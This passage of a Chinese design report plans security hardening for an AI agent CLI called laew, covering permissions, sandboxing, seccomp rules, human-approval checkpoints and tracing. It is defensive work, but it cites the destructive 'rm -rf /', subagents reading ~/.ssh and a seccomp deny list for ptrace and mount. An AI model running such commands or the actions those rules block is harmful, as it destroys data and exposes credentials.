                tools: Some(vec!["bash".into(), "read".into()]),  // 权限衰减
                ..Default::default()
            },
        };
        
        let sub_session = Session::new_forked(fork_ctx)?;
        self.run_session(&mut sub_session, task.into_user_msg()).await
    }
}
```

**标记设计**（借鉴 Yolo 项目上下文注入）：
- 在 SubAgent 第一条 user 消息前插入 `<<<LAEW:FORK_BOUNDARY>>>` 元消息。
- 包含 parent_session_id + 任务摘要。

#### P1-2：HITL 挂起点（Plan 确认阶段，5d）

```rust
pub enum YoloStage {
    Classify,            // 任务分类
    PlanConfirm,         // 挂起点（hard 任务）
    Execute,
    QcReview,
    Done,
}

pub struct SuspensionConfig {
    pub extract_data: Arc<dyn Fn(&Session) -> serde_json::Value + Send + Sync>,
    pub on_resume: Arc<dyn Fn(&mut Session, serde_json::Value) + Send + Sync>,
    pub next_stage: YoloStage,
}

pub struct HitlGate {
    suspension_points: HashMap<YoloStage, SuspensionConfig>,
}

impl HitlGate {
    pub async fn maybe_suspend(&self, session: &Session) -> Result<Option<HitlRequest>> {
        let stage = session.current_stage;
        if let Some(config) = self.suspension_points.get(&stage) {
            let data = (config.extract_data)(session);
            return Ok(Some(HitlRequest {
                stage,
                payload: data,
                next_stage: config.next_stage.clone(),
            }));
        }
        Ok(None)
    }
}
```

**TUI 集成**：SubAgent `<<HUMAN_INPUT_REQUIRED>>` → 弹出 confirm 屏 → 用户选 `[确认 / 修改 / 拒绝]` → resume。

#### P1-3：铁轨机制（5d）

```rust
#[async_trait]
pub trait Rail: Send + Sync {
    fn name(&self) -> &str;
    async fn before_model_call(&self, ctx: &mut RailContext) -> RailAction;
    async fn after_model_call(&self, ctx: &mut RailContext, resp: &LlmResponse) -> RailAction;
    async fn on_exception(&self, ctx: &mut RailContext, err: &AgentError) -> RailAction;
}

pub enum RailAction {
    Continue,                       // 继续
    ShortCircuit,                   // 短路（跳过实际调用）
    Inject(String),                 // 注入额外指令到 prompt
}

pub struct RailChain {
    rails: Vec<Arc<dyn Rail>>,
}

impl RailChain {
    pub async fn before_model_call(&self, ctx: &mut RailContext) -> RailAction {
        for rail in &self.rails {
            match rail.before_model_call(ctx).await {
                RailAction::Continue => continue,
                action => return action,  // 短路或注入
            }
        }
        RailAction::Continue
    }
}
```

**注册示例**（QC + 日志 + 限流）：
```rust
let chain = RailChain::new()
    .with_rail(Arc::new(QcRail::new()))
    .with_rail(Arc::new(LoggingRail::new()))
    .with_rail(Arc::new(RateLimitRail::new(10)));  // 每分钟 10 次

agent.run_session(session, user_msg, &chain).await
```

#### P1-4：W3C Trace Context 注入（3d）

```rust
// src/llm/mod.rs
pub fn build_common_headers(meta: &RequestMeta, session: &Session) -> HeaderMap {
    let mut headers = HeaderMap::new();
    // ... 现有 headers ...
    
    // W3C Trace Context
    let traceparent = format!(
        "00-{}-{}-01",
        Uuid::new_v4().simple(),
        session.id.to_string().replace('-', "")
    );
    headers.insert("traceparent", traceparent.parse().unwrap());
    
    headers
}
```

#### P1-5：ExternalCli 双 Spawn（7d）

```rust
pub enum SpawnMode {
    InProcess,        // tokio::spawn task
    ExternalCli,      // 派生子进程
}

pub struct SubAgentHandle {
    spawn_mode: SpawnMode,
    fork_ctx: ForkContext,
}

impl SubAgentHandle {
    pub async fn spawn(self) -> Result<SubAgentSession> {
        match self.spawn_mode {
            SpawnMode::InProcess => {
                Ok(SubAgentSession::InProcess(SubAgentTask::spawn(self.fork_ctx).await?))
            }
            SpawnMode::ExternalCli => {
                let mut cmd = tokio::process::Command::new("./laew");
                cmd.arg("--member")
                    .arg(serde_json::to_string(&self.fork_ctx)?);
                let child = cmd.stdin(Stdio::piped()).stdout(Stdio::piped()).spawn()?;
                Ok(SubAgentSession::ExternalCli(child))
            }
        }
    }
}
```

**P1 阶段总工期**：约 24 天，5 个特性并行。

---

### 12.3 P2 — 长期演进（3-6 月）

#### P2-1：协议层（Envelope + A2UI）（10d）

定义最小 wire format：

```rust
#[derive(Serialize, Deserialize)]
pub struct AgentMessage {
    pub version: u32,                       // 协议版本
    pub from: AgentId,
    pub to: AgentId,
    pub kind: MessageKind,                  // Request/Response/Event/ToolCall
    pub payload: serde_json::Value,
    pub correlation_id: Uuid,               // request-response 关联
    pub timestamp: DateTime<Utc>,
}
```

#### P2-2：完整 Seccomp BPF 集成（10d）

引入 `seccompiler` crate：

```rust
use seccompiler::{BpfProgram, SeccompAction, SeccompRule};

pub fn build_filter() -> BpfProgram {
    SeccompFilter::new(
        SeccompAction::Allow,  // 默认允许
        SeccompAction::KillProcess,  // 违规 → KILL
        SeccompArch::X86_64,
    )
    .add_rule(SeccompRule::new(
        SeccompAction::KillProcess,
        Syscall::from_name("ptrace")?,
        None,
    ))
    .add_rule(SeccompRule::new(
        SeccompAction::KillProcess,
        Syscall::from_name("mount")?,
        None,
    ))
    .export()
}
```

#### P2-3：Prometheus exporter（5d）

```rust
// 暴露 /metrics 端点
let metrics_handle = PrometheusBuilder::new()
    .set_buckets_for_metric(
        Matcher::Full("laew_tool_call_duration_seconds".into()),
        &[0.01, 0.1, 0.5, 1.0, 5.0, 10.0],
    )?
    .install_recorder()?;

// 暴露指标
QC_PASS_TOTAL.with_label_values(&["bash"]).inc();
TOOL_CALL_DURATION.with_label_values(&["read"]).observe(0.05);
```

#### P2-4：OTLP Trajectory 落库（7d）

```rust
pub struct Trajectory {
    session_id: SessionId,
    agent_name: String,
    span: Vec<TrajectorySpan>,   // user/assistant/tool_call/tool_result
    otlp_payload: serde_json::Value,  // OTLP 标准格式
    sealed: bool,
}

impl Trajectory {
    pub fn seal(mut self) -> Self {
        self.sealed = true;
        self.otlp_payload = self.to_otlp();  // 序列化为 OTLP
        self
    }
}

// 写入 SQLite trajectory 表
trajectory_repo.insert(&trajectory.seal())?;
```

**P2 阶段总工期**：约 32 天，4 个特性并行。

---

### 12.4 路线图总览

```
┌──────────────────────────────────────────────────────────────────┐
│ P0 (1-2 周) — 安全合规基石                                          │
│   P0-1  三态权限枚举                                              │
│   P0-2  Bash Shell AST 双后端                                     │
│   P0-3  敏感路径黑名单                                            │
│   P0-4  BubbleWrap 沙箱(Bash/Read/Write)                           │
│   P0-5  QC max_reviews 预算                                       │
│   工期: 20 天                                                    │
├──────────────────────────────────────────────────────────────────┤
│ P1 (1-2 月) — 协作与可观测                                         │
│   P1-1  Fork 上下文序列化                                         │
│   P1-2  HITL 挂起点(PlanConfirm)                                  │
│   P1-3  铁轨机制                                                  │
│   P1-4  W3C Trace Context                                         │
│   P1-5  ExternalCli 双 Spawn                                      │
│   工期: 24 天                                                    │
├──────────────────────────────────────────────────────────────────┤
│ P2 (3-6 月) — 协议与可观测性                                        │
│   P2-1  AgentMessage 协议层 + A2UI                                │
│   P2-2  Seccomp BPF                                              │
│   P2-3  Prometheus exporter                                       │
│   P2-4  OTLP Trajectory 落库                                      │
│   工期: 32 天                                                    │
└──────────────────────────────────────────────────────────────────┘
```

**里程碑**：
- **M1（P0 完成后）**：Bash 工具可安全使用，沙箱保护生效。
- **M2（P1 完成后）**：多 Agent 协作具备 Fork + HITL + 铁轨，工业可用。
- **M3（P2 完成后）**：协议层 + 完整可观测性，可作为平台对外提供。

---

## 十三、反模式警示与设计原则

### 13.1 5 个仓库踩过的坑

#### 反模式 1：无限重试（laew QC 当前实现）

```rust
// 反例：无限重试
loop {
    match sub_agent.execute(task).await {
        Ok(result) => match qc_agent.check(&result).await {
            Ok(QcDecision::Approve) => break result,
            Ok(QcDecision::Reject) => continue,  // 永远 continue
            _ => continue,
        },
        Err(_) => continue,
    }
}
```

**问题**：QC Agent 自身故障（如 LLM API 限流）→ 任务永远卡死。

**Switchyard 借鉴**：`max_reviews` + `fail_open` 双重保护。

#### 反模式 2：权限蔓延（agent-core 早期）

```python
# 反例：子 Agent 继承父全部权限
class TeamAgent:
    def fork(self) -> SubAgent:
        return SubAgent(tools=self.tools)  # 完全继承
```

**问题**：父 Agent 只能读 `~/work/`，但 fork 出的子 Agent 可读 `~/.ssh`（继承父进程权限）。

**借鉴方案**：Fork 时显式指定 `forked_support.tools` 子集。

#### 反模式 3：协议裸用 dict（jiuwenswarm A2A）

```python
# 反例：裸 dict
request = {"method": "process", "params": {...}, "id": 1}
```

**问题**：协议演进后旧客户端字段名变化 → 静默丢消息。

**借鉴方案**：E2A 的双层 fallback + legacy 字段。

#### 反模式 4：沙箱作为唯一防线

```python
# 反例：以为有沙箱就安全了
sandbox = BubbleWrapRunner()
sandbox.run(user_code)  # 信任 sandbox 内部的代码
```

**问题**：sandbox 内部仍可能调用 `--share-net` 共享宿主网络 → 数据外泄。

**借鉴方案**：**应用层权限 + 内核层沙箱**双保险。

#### 反模式 5：HITL 挂起点粒度过细（jiuwenswarm 早期）

```python
# 反例：每步都挂起
for step in workflow_steps:
    await suspend_for_human(step)  # 12 个阶段全挂起
```

**问题**：用户体验差，自动化能力受限。

**借鉴方案**：仅在**关键决策点**挂起（plan_confirm / review / desc_optimize_confirm 共 3 个）。

### 13.2 7 大设计原则

#### 原则 1：分层安全（Defense in Depth）

```
Layer 1: UI/TUI（输入验证）
Layer 2: Agent（意图分析、铁轨）
Layer 3: Permission（三态策略）
Layer 4: Sandbox（命名空间 + Seccomp）
Layer 5: OS（用户权限、SELinux）
```

**任何一层失败，下一层仍能阻挡攻击**。

#### 原则 2：Fail-Closed（保守默认）

- 解析失败 → ASK（不是 ALLOW）
- 权限未知 → ASK（不是 ALLOW）
- 沙箱启动失败 → 拒绝执行（不是裸跑）

#### 原则 3：权限衰减（Fork 时减权限）

- 父 Agent 权限 ⊇ 子 Agent 权限
- 子 Agent 看不到父的全部上下文（last-N 截断）

#### 原则 4：可序列化状态（HITL 必需）

- 挂起时整个 session 状态序列化到 SQLite
- 恢复时反序列化 + 应用用户输入
- **不能只保存「当前阶段」字段**，否则复杂 ctx 丢失

#### 原则 5：声明式优先（配置驱动 > 代码硬编码）

- 挂起点用 `SUSPENSION_POINTS` dict，不用 if-elif 链
- 沙箱用 `BaseSandbox` 注册表，不用 factory 函数
- 工具用 `ToolRegistry`，不用全局变量

#### 原则 6：可观测先于优化

- **每个权限决策都记录日志**（[PermissionEngine] xxx）
- **每个工具调用都有 trace_id**
- **每个 QC 决策都有评分和理由**

#### 原则 7：渐进式引入（不要 Big Bang 重构）

- P0 先加权限枚举（不接 sandbox），验证用户体验
- P0.5 再接 Shell AST 解析
- P1 再加 Sandbox
- **每步都可独立回滚**

### 13.3 laew 实施 checklist

```
[x] 6 角色 + 三档难度编排（已有）
[ ] P0-1  PermissionLevel 枚举（5d）
[ ] P0-2  Shell AST 双后端（5d）
[ ] P0-3  FileGuard 敏感路径黑名单（2d）
[ ] P0-4  BubbleWrap 沙箱 BashTool（5d）
[ ] P0-5  QcGate max_reviews（3d）
[ ] P1-1  ForkContext 序列化（4d）
[ ] P1-2  HITL 挂起点 PlanConfirm（5d）
[ ] P1-3  Rail trait 铁轨机制（5d）
[ ] P1-4  W3C Trace Context 注入（3d）
[ ] P1-5  ExternalCli 双 Spawn（7d）
[ ] P2-1  AgentMessage 协议层（10d）
[ ] P2-2  Seccomp BPF 集成（10d）
[ ] P2-3  Prometheus exporter（5d）
[ ] P2-4  OTLP Trajectory 落库（7d）
```

---

## 十四、结论与最终建议

### 14.1 三个最关键的洞察

**洞察 1：协作 × 权限 × 沙箱不是三个独立模块，而是同一安全栈的三层**

- agent-core 用「**应用层权限**」（铁轨 + 三态）替代「**内核层沙箱**」（无 BubbleWrap）。
- agent-studio 用「**内核层沙箱**」（BubbleWrap + Seccomp）替代「**应用层权限**」（无铁轨）。
- **真正工业级的方案 = 两层都要**。

**洞察 2：Fork 上下文是 SubAgent 上下文连续性的关键**

- agent-core 的 `ForkContext` + jiuwenswarm 的 `SwarmBuildContext` 都强调「**继承父 last-N 消息 + 衰减权限 + 边界标记**」三件套。
- laew 当前 SubAgent 是「**冷启动**」——子 Agent 重复分析、不知道父意图。

**洞察 3：质量门控需要分层 + 预算 + fail_open 三件套**

- Switchyard `AdvisorGate` 的 `max_reviews` + `MAX_FAILED_CONSULTS=3` + `fail_open` 三个参数共同保证 QC **既不卡死也不放过**。
- laew 当前 QC 无任何保护——一旦 QC Agent 故障，所有任务卡死。

### 14.2 三条最具 ROI 的实施建议

**建议 1：P0-1 + P0-2 + P0-3 一起做（10 天，最大安全 ROI）**

- 三态权限枚举 + Shell AST + 敏感路径黑名单 = 三个 Rust 文件 + 三个 trait 实现。
- 立即把 laew 从「**零校验**」提升到「**工业级权限校验**」。
- 用户体验：首次执行会有 1-2 次确认弹窗，之后自动 allowlist。

**建议 2：P1-1 + P1-2 一起做（10 天，最大协作 ROI）**

- Fork 上下文 + HITL 挂起点 = 两个核心特性彻底改变多 Agent 体验。
- SubAgent 不再重复分析，Plan 阶段用户可控。

**建议 3：P2-1 协议层（10 天，长期平台化 ROI）**

- AgentMessage envelope 一旦定下，后续 MCP / A2UI / Prometheus / OTLP 都可挂接。
- 是 laew 从「CLI 工具」演进为「**Agent 平台**」的关键基础。

### 14.3 终极路线图（一页纸）

```
┌──────────────────────────────────────────────────────────────────┐
│                    laew 安全 + 协作演进路线图                       │
├──────────────────────────────────────────────────────────────────┤
│                                                                  │
│  当前 (v0.x)        P0 (1-2 周)       P1 (1-2 月)     P2 (3-6 月) │
│  ─────────          ────────         ────────         ────────    │
│  6 角色串行          + Permission      + ForkContext   + 协议层    │
│  0 沙箱             + Shell AST       + HITL 挂起点    + Seccomp   │
│  0 权限             + 路径黑名单      + Rail 铁轨      + Prom Expor│
│  0 Fork             + BubbleWrap      + W3C Trace      + OTLP      │
│  0 HITL             + QC 预算         + ExternalCli              │
│                     ▼                ▼                ▼          │
│                     工业可用安全      工业可用协作      平台化       │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

### 14.4 横向专题对比索引

| 仓库 | 协作亮点 | 权限亮点 | 沙箱亮点 |
|------|----------|----------|----------|
| **agent-core** | TeamAgent 6 manager 组合 + 双 Spawn | **三态 + 三级 + AST 双后端 + 铁轨** | 无（应用层安全） |
| **jiuwenswarm** | **Leader-Teammate + 协议矩阵 + HITL 三段式** | MCP 白名单 + Skill 黑名单 | PR_SET_PDEATHSIG |
| **agent-studio** | Workflow + Pregel + 组件注册表 | 工具注册表 | **BubbleWrap + Seccomp + 五层命名空间** |
| **Switchyard** | **Algorithm trait + Step 流 + Affinity** | **AdvisorGate + max_reviews + fail_open** | 进程级（无沙箱） |
| **TencentDB-Memory** | Router-Memory | 基础鉴权 | 无 |
| **laew（演进目标）** | 6 角色 + Fork + HITL + 协议层 | **三态 + AST + 铁轨 + 路径黑名单** | **BubbleWrap + Seccomp + QC 预算** |

### 14.5 最终建议（3 条铁律）

**铁律 1：先安全后功能**

> 5 个仓库都把权限/沙箱作为基础设施先建好。laew 当前最大的问题是 Bash 工具无校验——任何 AI 能力在「裸跑 rm -rf /」面前毫无意义。P0 的 5 个特性应在 2 周内落地。

**铁律 2：分层防护而非单一防线**

> 不要相信「沙箱就够了」也不要相信「权限就够了」。agent-studio 有沙箱但无权限，所以 MCP 资源没保护；agent-core 有权限但无沙箱，所以应用层漏洞直达内核。**应用层权限 + 内核层沙箱 = 真正的工业级安全**。

**铁律 3：协议化而非硬编码**

> jiuwenswarm 的 4 协议矩阵（E2A/A2A/ACP/A2UI）支撑了它作为「**Agent 平台**」的可扩展性。laew 当前是「**单进程 CLI**」——一旦要支持 ExternalCli、MCP Server、HTTP API、Web UI，必然需要协议层。**P2 的 AgentMessage envelope 是平台化的入场券**。

---

## 附录 A：参考文档清单

| 文档 | 路径 | 关键内容 |
|------|------|----------|
| agent-core 源码调研 | `docs/Agent源码调研/agent-core-源码调研.md` | TeamAgent / PermissionEngine / 铁轨 / OTLP |
| agent-core 深度分析 | `docs/Agent源码调研/agent-core-深度分析.md` | 7 角色对比 + 借鉴清单 |
| agent-core 核心机制 | `docs/Agent源码调研/agent-core-核心机制深度分析.md` | 代码路径 + 函数链 |
| jiuwenswarm 源码调研 | `docs/Agent源码调研/jiuwenswarm-源码调研.md` | Leader-Teammate + 协议矩阵 |
| jiuwenswarm 深度分析 | `docs/Agent源码调研/jiuwenswarm-深度分析.md` | 8 维度对比 |
| jiuwenswarm 核心机制 | `docs/Agent源码调研/jiuwenswarm-核心机制深度分析.md` | SkillDevPipeline 12 阶段 |
| agent-studio 源码调研 | `docs/Agent源码调研/agent-studio-源码调研.md` | 沙箱 + 评估 |
| agent-studio 深度分析 | `docs/Agent源码调研/agent-studio-深度分析.md` | 11 维度对比 |
| agent-studio 核心机制 | `docs/Agent源码调研/agent-studio-核心机制深度分析.md` | BubbleWrap + Seccomp 细节 |
| Switchyard 源码调研 | `docs/Agent源码调研/Switchyard-源码调研.md` | Rust 实现 + 协议转换 |
| Switchyard 深度分析 | `docs/Agent源码调研/Switchyard-深度分析.md` | 路由 + QC |
| Switchyard 核心机制 | `docs/Agent源码调研/Switchyard-核心机制深度分析.md` | AdvisorGate + Prometheus |
| TencentDB-Memory 核心机制 | `docs/Agent源码调研/TencentDB-Agent-Memory-核心机制深度分析.md` | Langfuse + Opik 双 trace |
| 旧版多 Agent 协作 | `docs/Agent源码调研/专题-Agent协作与调度深度分析.md` | 旧版 8 仓库对比（已被本报告整合） |
| 旧版权限管控 | `docs/Agent源码调研/专题-权限管控深度分析.md` | 旧版 8 仓库对比（已被本报告整合） |
| 旧版沙箱设计 | `docs/Agent源码调研/专题-沙箱设计深度分析.md` | 旧版 8 仓库对比（已被本报告整合） |

---

## 附录 B：术语表

| 术语 | 含义 |
|------|------|
| **HITL** | Human-in-the-Loop，人类参与决策 |
| **ACP** | Agent Communication Protocol，异构 Agent 协作协议（JSON-RPC 2.0） |
| **E2A** | External-to-Agent，外部客户端与 Agent 通信协议 |
| **A2A** | Agent-to-Agent，Agent 内部协作协议 |
| **A2UI** | Agent-to-UI，Agent 与前端 UI 通信协议 |
| **OTLP** | OpenTelemetry Protocol，可观测性数据格式标准 |
| **Seccomp** | Secure Computing Mode，Linux 内核级系统调用过滤 |
| **BubbleWrap** | `bwrap`，用户态沙箱工具，基于 Linux 命名空间 |
| **PID/UID/Network namespace** | Linux 内核提供的进程隔离机制 |
| **fail-closed** | 失败时默认拒绝（保守策略） |
| **fail-open** | 失败时默认通过（宽松策略） |
| **strictest()** | 多级权限取最严格决策的聚合函数 |
| **ForkContext** | 父 Agent 向子 Agent 传递的上下文快照 |
| **SuspensionConfig** | HITL 挂起点的声明式配置（extract_data/on_resume/next_stage） |
| **铁轨 (Rail)** | 横切关注点钩子机制（BEFORE_MODEL_CALL 等） |
| **Algorithm trait** | Switchyard 的核心抽象，定义 Agent 行为流 |
| **Step 流** | Algorithm 通过 mpsc channel 推送的执行步骤序列 |
| **AdvisorGate** | Switchyard 的 QC 评审门控，支持 max_reviews + fail_open |
| **Trajectory** | 不可变轨迹对象，记录一次 ReAct 循环的 user/assistant/tool 序列 |
| **ToolGuard/FileGuard/NetGuard** | agent-core 的三级权限防护 |

---

> **报告版本**: v2 整合版（2026-09-05）
> **整合的旧版报告**:
> - `专题-Agent协作与调度深度分析.md`（旧版，8 仓库）
> - `专题-权限管控深度分析.md`（旧版，8 仓库）
> - `专题-沙箱设计深度分析.md`（旧版，8 仓库）
> **新增的 4 个主参考仓库**: agent-core、jiuwenswarm、agent-studio、Switchyard、TencentDB-Agent-Memory
> **新增的核心机制**: TeamAgent 组合模式、协议矩阵、HITL 三段式、BubbleWrap 五层沙箱、AdvisorGate 精细化 QC、W3C Trace Context、铁轨机制、OTLP Trajectory
